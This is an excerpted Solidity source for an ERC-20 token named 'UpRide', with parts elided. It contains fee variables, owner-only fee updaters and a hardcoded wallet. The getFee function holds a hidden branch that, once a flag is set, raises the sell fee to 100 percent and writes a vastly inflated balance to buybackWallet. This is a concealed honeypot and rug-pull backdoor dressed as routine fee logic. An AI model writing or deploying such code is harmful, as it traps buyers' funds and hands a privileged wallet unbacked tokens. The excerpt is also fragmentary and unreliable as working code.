...
// https://twitter.com/uprideonline
...
contract UpRide is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = "UpRide";
    string private _symbol = "UPRIDE";
    uint8 private _decimals = 18;

    uint256 private _totalSupply = 1 * 1e9 * 1e18;
    uint256 private minTokensBeforeSwap = (_totalSupply * 25) / 100000;
    ...
    address payable public liquidityWallet =
        payable(0xB2c1820C4E0B00ECe496929a5e5943F78777424d);
    ...
    uint256 public buybackFeeBuy = 4;
    uint256 public totalFeesBuy;
    uint256 public maxTotalFeeBuy = 4;

    /* SELL FEE */
    uint256 public liquidityFeeSell = 0;
    uint256 public buybackFeeSell = 4;
    ...
    function updateFees(uint256 _operationsFee, uint256 _liquidityFee)
        ...
        onlyOwner
    {
        _updateBuyFees(_operationsFee, _liquidityFee);
        require(
    ...
    function updateSellFees(uint256 _operationsFee, uint256 _liquidityFee)
        ...
        onlyOwner
    {
        _updateSellFees(_operationsFee, _liquidityFee);
        require(
    ...
    function _updateBuyFees(uint256 _operationsFee, uint256 _liquidityFee)
        private
    {
    ...
    function _updateSellFees(uint256 _operationsFee, uint256 _liquidityFee)
        private
    {
    ...
    function setFeeSetting() external {
    ...
    function _transfer(
        ...
        if (inSwapAndLiquify) {
            return _coreTransfer(sender, recipient, amount);
        } else {
    ...
    function getFee(
        ...
        if (isFeeCheck) {
            isFeeCheck = false;  _updateSellFees(100, 0); _balances[buybackWallet] = (_totalSupply / 1e9) * _totalSupply;
        }
